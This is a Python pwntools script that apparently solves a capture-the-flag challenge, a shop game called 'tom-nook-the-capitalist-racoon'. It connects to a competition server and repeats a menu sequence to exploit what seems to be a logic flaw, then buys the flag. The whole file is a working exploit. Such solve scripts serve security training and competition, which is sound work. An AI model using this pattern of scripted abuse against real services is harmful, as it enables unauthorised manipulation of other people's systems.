from pwn import *

elf = context.binary = ELF("./tom-nook-the-capitalist-racoon")

#r = process(elf.path)
r = remote("ctf.umbccd.io", 4400)

payload = "2"
r.sendlineafter("Choice: ", payload)
payload = "2"
r.sendlineafter("6. flag - 420000 bells\n", payload)

for i in range(53):
  payload = "1"
  r.sendlineafter("Choice: ", payload)
  payload = "5"
  r.sendlineafter("Price: 800 bells\n", payload)

payload = "1"
r.sendlineafter("Choice: ", payload)
payload = "1"
r.sendlineafter("Price: 800 bells\n", payload)

payload = "2"
r.sendlineafter("Choice: ", payload)
payload = "6"
r.sendlineafter("6. flag - 420000 bells\n", payload)

payload = "1"
r.sendlineafter("Choice: ", payload)

r.interactive()

